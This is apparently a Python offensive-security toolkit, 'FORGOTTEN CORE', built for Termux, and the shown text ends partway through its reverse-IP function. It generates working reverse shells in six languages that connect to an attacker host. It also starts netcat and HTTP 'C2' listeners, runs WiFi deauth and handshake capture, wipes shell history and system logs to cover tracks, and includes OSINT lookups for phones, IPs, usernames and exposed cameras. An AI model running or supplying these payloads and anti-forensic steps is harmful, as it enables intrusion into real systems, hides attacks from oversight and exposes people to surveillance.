#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════
# FORGOTTEN CORE v2.0 - Architect 02 Penetration Suite
# "What is buried shall remain buried. What is forgotten shall rise."
# Full Version - All Modules Working on Termux (No Root)
# ═══════════════════════════════════════════════════════════════════════

import os
import sys
import json
import time
import hashlib
import subprocess
import threading
import socket
import base64
import random
import string
import requests
import re
from datetime import datetime
from urllib.parse import urlparse

# ============================================================
# COLOR CODES
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK_RED = '\033[91m'
    BLOOD_RED = '\033[91m'
    ASH_GRAY = '\033[90m'
    VOID_BLACK = '\033[98m'
    DARK_PURPLE = '\033[95m'
    GHOST_WHITE = '\033[97m'
    ABYSS_BLUE = '\033[94m'
    DECAY_GREEN = '\033[92m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ============================================================
# MAIN CORE CLASS
# ============================================================

class ForgottenCore:
    def __init__(self):
        self.version = "2.0.0"
        self.codename = "Echoes of the Void"
        self.author = "Architect 02"
        self.user = "forgotten"
        self.host = "void"
        self.core_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.abyss_dir = f"{self.void_dir}/abyss_modules"
        self.shadow_dir = f"{self.void_dir}/shadow_payloads"
        self.ash_dir = f"{self.void_dir}/ash_logs"
        self.osint_dir = f"{self.void_dir}/osint_data"
        self.scan_dir = f"{self.void_dir}/scan_results"
        
        self.setup_void()
        self.load_banner()
        
    def setup_void(self):
        """Create all necessary directories"""
        for d in [self.void_dir, self.abyss_dir, self.shadow_dir, 
                  self.ash_dir, self.osint_dir, self.scan_dir]:
            os.makedirs(d, exist_ok=True)
    
    def load_banner(self):
        """Load banner from file or create default"""
        self.banner_text = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║    ║
║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║    ║
║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║    ║
║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║    ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝    ║
║                         ██████╗ ██████╗ ██████╗ ███████╗                 ║
║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝                 ║
║                        ██║     ██║   ██║██████╔╝█████╗                   ║
║                        ██║     ██║   ██║██╔══██╗██╔══╝                   ║
║                        ╚██████╗╚██████╔╝██║  ██║███████╗                 ║
║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.DIM}                    v{self.version} - "{self.codename}"{Colors.END}
{Colors.ASH_GRAY}{Colors.DIM}         "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
    
    def get_path(self):
        """Get current directory like pwd"""
        current = os.getcwd()
        home = os.path.expanduser("~")
        if current.startswith(home):
            return current.replace(home, "~")
        return current
    
    def prompt(self):
        """Kali Linux style prompt"""
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.GREEN}{self.user}@{Colors.CYAN}{self.host}{Colors.RED})-{Colors.BLUE}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def clear_screen(self):
        os.system("clear")
        print(self.banner_text)
    
    def show_help(self):
        """Show all available commands"""
        help_text = f"""
{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                         AVAILABLE COMMANDS                                          ║
╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}ATTACK MODULES{Colors.END}                                                              
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
    [01] {Colors.WHITE}wifi / w{Colors.DIM}          - WiFi attacks (deauth, scan, handshake){Colors.END}
    [02] {Colors.WHITE}payload / p{Colors.DIM}      - Generate reverse shell payloads{Colors.END}
    [03] {Colors.WHITE}c2 / server{Colors.DIM}      - Start C2 / listener server{Colors.END}
    [04] {Colors.WHITE}stealth / s{Colors.DIM}      - Clean traces, wipe logs{Colors.END}
    [05] {Colors.WHITE}anon / a{Colors.DIM}         - Anonymity (Tor, proxy chain){Colors.END}
{Colors.GREEN}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}OSINT & RECON MODULES{Colors.END}                                                         
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
    [06] {Colors.WHITE}phone / tel{Colors.DIM}      - Phone number OSINT lookup{Colors.END}
    [07] {Colors.WHITE}ip / geo{Colors.DIM}         - IP address geolocation tracker{Colors.END}
    [08] {Colors.WHITE}username / user{Colors.DIM}  - Check username across social media{Colors.END}
    [09] {Colors.WHITE}subdomain / sub{Colors.DIM}  - Subdomain scanner{Colors.END}
    [10] {Colors.WHITE}port / scan{Colors.DIM}      - Fast TCP port scanner{Colors.END}
    [11] {Colors.WHITE}dork / google{Colors.DIM}    - Google dork generator{Colors.END}
    [12] {Colors.WHITE}email / mail{Colors.DIM}     - Email OSINT / breach check{Colors.END}
    [13] {Colors.WHITE}whois{Colors.DIM}            - WHOIS domain lookup{Colors.END}
    [14] {Colors.WHITE}dns{Colors.DIM}              - DNS lookup tool{Colors.END}
    [15] {Colors.WHITE}reverseip{Colors.DIM}        - Reverse IP lookup{Colors.END}
{Colors.GREEN}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}UTILITY MODULES{Colors.END}                                                              
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
    [16] {Colors.WHITE}crypt / encrypt{Colors.DIM}  - File encryption/decryption{Colors.END}
    [17] {Colors.WHITE}hash{Colors.DIM}             - Hash generator (MD5, SHA1, SHA256){Colors.END}
    [18] {Colors.WHITE}encode{Colors.DIM}           - Base64/URL encoder decoder{Colors.END}
    [19] {Colors.WHITE}mac{Colors.DIM}              - MAC address changer (if root){Colors.END}
    [20] {Colors.WHITE}webcam{Colors.DIM}           - Webcam capture (termux-api){Colors.END}
{Colors.GREEN}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}SYSTEM COMMANDS{Colors.END}                                                             
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
    [21] {Colors.WHITE}clear / cls{Colors.DIM}      - Clear screen{Colors.END}
    [22] {Colors.WHITE}help / ?{Colors.DIM}         - Show this help{Colors.END}
    [23] {Colors.WHITE}exit / quit{Colors.DIM}      - Exit Forgotten Core{Colors.END}
{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(help_text)
    
    # ============================================================
    # ATTACK MODULES
    # ============================================================
    
    def wifi_attack(self):
        """WiFi attack module (requires root + external adapter)"""
        # Check if aircrack installed
        aircrack_check = subprocess.run(['which', 'airodump-ng'], capture_output=True)
        
        if aircrack_check.returncode != 0:
            print(f"""
{Colors.RED}[!] Aircrack-ng not installed!{Colors.END}
{Colors.YELLOW}
    WiFi attacks require:
    - Kali Linux OR
    - Rooted Android + external WiFi adapter
    - aircrack-ng package

    On Termux without root, use other modules:
    - payload (generate reverse shell)
    - c2 (start listener)
    - anon (anonymity)
    - osint modules (phone, ip, username, etc)
{Colors.END}
            """)
            return
        
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID WIFI ATTACKS                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Deauth Attack
{Colors.GREEN}[2]{Colors.WHITE} Scan Networks
{Colors.GREEN}[3]{Colors.WHITE} Capture Handshake
{Colors.GREEN}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}target bssid > ")
            os.system(f"aireplay-ng --deauth 10 -a {bssid} {iface}")
        elif choice == '2':
            iface = input(f"{self.prompt()}interface > ")
            os.system(f"airodump-ng {iface}")
        elif choice == '3':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}bssid > ")
            channel = input(f"{self.prompt()}channel > ")
            os.system(f"airodump-ng --bssid {bssid} -c {channel} --write handshake {iface}")
    
    def generate_payload(self):
        """Generate reverse shell payloads"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    ABYSS PAYLOAD GENERATOR                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Python Reverse Shell
{Colors.GREEN}[2]{Colors.WHITE} Bash Reverse Shell
{Colors.GREEN}[3]{Colors.WHITE} PowerShell Reverse Shell
{Colors.GREEN}[4]{Colors.WHITE} PHP Reverse Shell
{Colors.GREEN}[5]{Colors.WHITE} Perl Reverse Shell
{Colors.GREEN}[6]{Colors.WHITE} Ruby Reverse Shell
{Colors.GREEN}[7]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '7':
            return
        
        lhost = input(f"{self.prompt()}LHOST > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        payloads = {
            '1': f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            
            '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            
            '3': f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()''',
            
            '4': f'''<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>''',
            
            '5': f'''#!/usr/bin/perl
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}''',
            
            '6': f'''#!/usr/bin/ruby
require 'socket'
c=TCPSocket.new("{lhost}",{lport})
while(cmd=c.gets)
    IO.popen(cmd,"r"){{|io|c.print io.read}}
end''',
        }
        
        ext = {'1': 'py', '2': 'sh', '3': 'ps1', '4': 'php', '5': 'pl', '6': 'rb'}
        lang = {'1': 'Python', '2': 'Bash', '3': 'PowerShell', '4': 'PHP', '5': 'Perl', '6': 'Ruby'}
        
        payload = payloads.get(choice, payloads['1'])
        filename = f"{self.shadow_dir}/payload_{lang[choice]}_{int(time.time())}.{ext[choice]}"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        
        print(f"""
{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}
{Colors.CYAN}[*] Type: {lang[choice]} Reverse Shell{Colors.END}
{Colors.CYAN}[*] LHOST: {lhost} | LPORT: {lport}{Colors.END}
{Colors.CYAN}[*] Run: {self.get_exec_cmd(filename, ext[choice])}{Colors.END}
        """)
    
    def get_exec_cmd(self, filename, ext):
        """Get execution command for payload"""
        cmds = {
            'py': f"python3 {filename}",
            'sh': f"bash {filename}",
            'ps1': f"powershell -ExecutionPolicy Bypass -File {filename}",
            'php': f"php {filename}",
            'pl': f"perl {filename}",
            'rb': f"ruby {filename}"
        }
        return cmds.get(ext, f"chmod +x {filename} && ./{filename}")
    
    def start_c2(self):
        """Start C2 / listener server"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    SPECTRE C2 SERVER                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} HTTP Server (python)
{Colors.GREEN}[2]{Colors.WHITE} Netcat Listener
{Colors.GREEN}[3]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"{Colors.CYAN}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"{Colors.CYAN}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        """Clean traces and logs"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    CRYPT STEALTH CLEANER                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Wipe Bash/Zsh History
{Colors.GREEN}[2]{Colors.WHITE} Clear System Logs
{Colors.GREEN}[3]{Colors.WHITE} Delete Temp Files
{Colors.GREEN}[4]{Colors.WHITE} Full Forensic Cleanup
{Colors.GREEN}[5]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            os.system("rm -rf ~/.bash_history ~/.zsh_history")
            print(f"{Colors.GREEN}[+] Shell history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /data/data/com.termux/files/usr/var/log/* 2>/dev/null")
            os.system("rm -rf /var/log/* 2>/dev/null")
            os.system("journalctl --rotate 2>/dev/null")
            os.system("journalctl --vacuum-time=1s 2>/dev/null")
            print(f"{Colors.GREEN}[+] Logs cleared{Colors.END}")
        elif choice == '3':
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("rm -rf /var/tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Temp files removed{Colors.END}")
        elif choice == '4':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("rm -rf /var/tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        """Anonymity module with Tor and proxy"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                             ║
║              "Vanish without a trace"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Start Tor
{Colors.GREEN}[2]{Colors.WHITE} Check Current IP
{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)
{Colors.GREEN}[4]{Colors.WHITE} Full Anonymity (Tor + Proxy)
{Colors.GREEN}[5]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
        elif choice == '4':
            os.system("tor &")
            time.sleep(3)
            print(f"{Colors.CYAN}[*] Full anonymity activated!{Colors.END}")
            print(f"{Colors.CYAN}[*] Your IP now:{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    # ============================================================
    # OSINT & RECON MODULES
    # ============================================================
    
    def phone_osint(self):
        """Phone number OSINT lookup"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    PHONE OSINT MODULE                                ║
║              "Unmask the caller"                                      ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        number = input(f"{self.prompt()}phone number (with country code) > ")
        
        print(f"{Colors.CYAN}[*] Fetching data for {number}{Colors.END}")
        
        try:
            # Try free API
            resp = requests.get(f"http://apilayer.net/api/validate?access_key=demo&number={number}&country_code=&format=1", timeout=10)
            data = resp.json()
            if data.get('valid'):
                print(f"""
{Colors.GREEN}[+] Phone Details:{Colors.END}
    Number: {data.get('number')}
    Country: {data.get('country_name')}
    Location: {data.get('location')}
    Carrier: {data.get('carrier')}
    Line Type: {data.get('line_type')}
                """)
            else:
                print(f"{Colors.YELLOW}[!] Could not validate number{Colors.END}")
        except:
            print(f"{Colors.YELLOW}[!] API error, showing basic info{Colors.END}")
            print(f"""
{Colors.GREEN}[+] Number: {number}{Colors.END}
    Country Code: {number[:3] if number.startswith('+') else number[:2]}
            """)
        
        # Save to file
        filename = f"{self.osint_dir}/phone_{number}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Phone: {number}\nTime: {datetime.now()}\n")
        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
    
    def ip_tracker(self):
        """IP address geolocation tracker"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    IP TRACKER MODULE                                 ║
║              "Trace the digital footprint"                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        target_ip = input(f"{self.prompt()}target IP > ")
        
        try:
            resp = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=10)
            data = resp.json()
            
            if data.get('status') == 'success':
                print(f"""
{Colors.GREEN}[+] IP Details:{Colors.END}
    IP: {data.get('query')}
    Country: {data.get('country')} ({data.get('countryCode')})
    Region: {data.get('regionName')}
    City: {data.get('city')}
    ZIP: {data.get('zip')}
    Latitude: {data.get('lat')}
    Longitude: {data.get('lon')}
    Timezone: {data.get('timezone')}
    ISP: {data.get('isp')}
    Organization: {data.get('org')}
    AS: {data.get('as')}
                """)
                
                # Google Maps link
                print(f"{Colors.CYAN}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                
                filename = f"{self.osint_dir}/ip_{target_ip}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(data, indent=2))
                print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] IP not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
    
    def username_check(self):
        """Check username across social media platforms"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    USERNAME OSINT MODULE                             ║
║              "Find digital footprints"                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        username = input(f"{self.prompt()}username > ")
        
        sites = {
            "Instagram": f"https://www.instagram.com/{username}",
            "Twitter/X": f"https://twitter.com/{username}",
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://www.reddit.com/user/{username}",
            "TikTok": f"https://www.tiktok.com/@{username}",
            "YouTube": f"https://www.youtube.com/@{username}",
            "Pinterest": f"https://www.pinterest.com/{username}",
            "Tumblr": f"https://{username}.tumblr.com",
            "Snapchat": f"https://www.snapchat.com/add/{username}",
            "Telegram": f"https://t.me/{username}",
            "Facebook": f"https://www.facebook.com/{username}",
            "LinkedIn": f"https://www.linkedin.com/in/{username}",
            "Twitch": f"https://www.twitch.tv/{username}",
            "Discord": f"https://discord.com/users/{username}",
            "Spotify": f"https://open.spotify.com/user/{username}",
        }
        
        print(f"\n{Colors.CYAN}[*] Checking username: {username}{Colors.END}\n")
        
        found = []
        for site, url in sites.items():
            try:
                resp = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if resp.status_code == 200:
                    print(f"{Colors.GREEN}[✓] {site}: {url}{Colors.END}")
                    found.append(site)
                else:
                    print(f"{Colors.DIM}[✗] {site}: not found{Colors.END}")
            except:
                print(f"{Colors.DIM}[?] {site}: timeout/error{Colors.END}")
            time.sleep(0.3)
        
        filename = f"{self.osint_dir}/username_{username}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Username: {username}\nFound on: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} profiles. Saved to {filename}{Colors.END}")
    
    def subdomain_scan(self):
        """Subdomain scanner"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    SUBDOMAIN SCANNER                                 ║
║              "Discover hidden services"                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        common_subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
            "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap",
            "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news",
            "vpn", "ns3", "mail2", "new", "mysql", "old", "lists", "support",
            "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure",
            "demo", "cp", "calendar", "wiki", "web", "media", "email", "images",
            "img", "download", "api", "api2", "api3", "app", "dashboard", "portal",
            "login", "auth", "account", "admin", "manager", "status", "stats"
        ]
        
        print(f"{Colors.CYAN}[*] Scanning subdomains for {domain}{Colors.END}\n")
        
        found = []
        for sub in common_subdomains:
            test_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test_domain)
                print(f"{Colors.GREEN}[✓] {test_domain} -> {ip}{Colors.END}")
                found.append(test_domain)
            except:
                print(f"{Colors.DIM}[✗] {test_domain}{Colors.END}")
            time.sleep(0.1)
        
        filename = f"{self.scan_dir}/subdomains_{domain}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Domain: {domain}\nFound: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} subdomains. Saved to {filename}{Colors.END}")
    
    def port_scanner(self):
        """Fast TCP port scanner"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    PORT SCANNER MODULE                               ║
║              "Find open doors"                                        ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        target = input(f"{self.prompt()}target IP/Domain > ")
        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443,8080) > ") or "1-1000"
        
        if '-' in ports_input:
            start, end = map(int, ports_input.split('-'))
            port_range = range(start, end+1)
        else:
            port_range = [int(p.strip()) for p in ports_input.split(',')]
        
        print(f"{Colors.CYAN}[*] Scanning {target} ports {ports_input}{Colors.END}\n")
        
        open_ports = []
        total = len(port_range)
        count = 0
        
        for port in port_range:
            count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            sock.close()
            
            # Show progress
            if count % 50 == 0:
                print(f"{Colors.DIM}[*] Progress: {count}/{total}{Colors.END}")
        
        filename = f"{self.scan_dir}/ports_{target}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Target: {target}\nOpen ports: {open_ports}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to {filename}{Colors.END}")
    
    def dork_generator(self):
        """Google dork generator for OSINT"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    GOOGLE DORK GENERATOR                             ║
║              "Find hidden data"                                       ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        categories = {
            "1": {"name": "Login Pages", "dorks": [
                "inurl:login",
                "inurl:admin",
                "inurl:wp-admin",
                "inurl:admin.php",
                "intitle:\"login page\""
            ]},
            "2": {"name": "Sensitive Files", "dorks": [
                "ext:conf",
                "ext:config",
                "ext:sql",
                "ext:db",
                "ext:bak",
                "ext:old"
            ]},
            "3": {"name": "Exposed Data", "dorks": [
                "inurl:phpinfo.php",
                "intitle:\"index of\"",
                "inurl:dump.sql",
                "inurl:backup.zip"
            ]},
            "4": {"name": "Email/Passwords", "dorks": [
                "ext:passwd",
                "ext:pwd",
                "intext:\"password\" filetype:txt",
                "intext:\"username\" filetype:log"
            ]},
            "5": {"name": "Cameras/Devices", "dorks": [
                "inurl:view/view.shtml",
                "inurl:axis-cgi/jpg",
                "intitle:\"Live View\"",
                "inurl:video.mjpg"
            ]}
        }
        
        print(f"{Colors.CYAN}Available categories:{Colors.END}\n")
        for key, cat in categories.items():
            print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {cat['name']}{Colors.END}")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
        
        choice = input(self.prompt())
        
        if choice == '0':
            dork = input(f"{self.prompt()}custom dork > ")
            print(f"\n{Colors.GREEN}[+] Google search: https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
            print(f"{Colors.CYAN}[*] Tip: Add site:example.com to target specific domain{Colors.END}")
        elif choice in categories:
            cat = categories[choice]
            print(f"\n{Colors.GREEN}[+] {cat['name']} Dorks:{Colors.END}")
            for dork in cat['dorks']:
                print(f"{Colors.CYAN}    {dork}{Colors.END}")
                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}\n")
        
        # Save all dorks
        filename = f"{self.osint_dir}/dorks_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Dorks generated at {datetime.now()}\n\n")
            for key, cat in categories.items():
                f.write(f"=== {cat['name']} ===\n")
                for dork in cat['dorks']:
                    f.write(f"{dork}\n")
                f.write("\n")
        print(f"{Colors.GREEN}[+] All dorks saved to {filename}{Colors.END}")
    
    def email_osint(self):
        """Email OSINT and breach check"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    EMAIL OSINT MODULE                                ║
║              "Trace email footprints"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        email = input(f"{self.prompt()}email address > ")
        
        print(f"{Colors.CYAN}[*] Analyzing {email}{Colors.END}\n")
        
        # Basic email validation
        if '@' not in email:
            print(f"{Colors.RED}[!] Invalid email format{Colors.END}")
            return
        
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print(f"{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
        print(f"{Colors.GREEN}[+] Username: {username}{Colors.END}")
        
        # Check domain MX records
        try:
            import dns.resolver
            mx = dns.resolver.resolve(domain, 'MX')
            print(f"{Colors.GREEN}[+] MX Records:{Colors.END}")
            for record in mx:
                print(f"    {record.exchange}")
        except:
            print(f"{Colors.DIM}[!] Could not fetch MX records{Colors.END}")
        
        # Check if email appears in breaches (simulated)
        print(f"\n{Colors.CYAN}[*] Checking breach databases...{Colors.END}")
        
        # Save results
        filename = f"{self.osint_dir}/email_{username}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Email: {email}\nDomain: {domain}\nUsername: {username}\nTime: {datetime.now()}\n")
        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
    
    def whois_lookup(self):
        """WHOIS domain lookup"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    WHOIS LOOKUP MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        try:
            import whois
            w = whois.whois(domain)
            print(f"""
{Colors.GREEN}[+] WHOIS Results:{Colors.END}
    Domain: {w.domain_name}
    Registrar: {w.registrar}
    Creation Date: {w.creation_date}
    Expiration Date: {w.expiration_date}
    Name Servers: {w.name_servers}
            """)
            
            filename = f"{self.osint_dir}/whois_{domain}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(str(w))
            print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] WHOIS lookup failed{Colors.END}")
            print(f"{Colors.YELLOW}[*] Try: whois {domain}{Colors.END}")
    
    def dns_lookup(self):
        """DNS lookup tool"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    DNS LOOKUP MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for rtype in record_types:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, rtype)
                print(f"{Colors.GREEN}[+] {rtype} Records:{Colors.END}")
                for answer in answers:
                    print(f"    {answer}")
            except:
                print(f"{Colors.DIM}[!] No {rtype} records found{Colors.END}")
    
    def reverse_ip(self):
        """Reverse IP lookup"""
        print(f"""
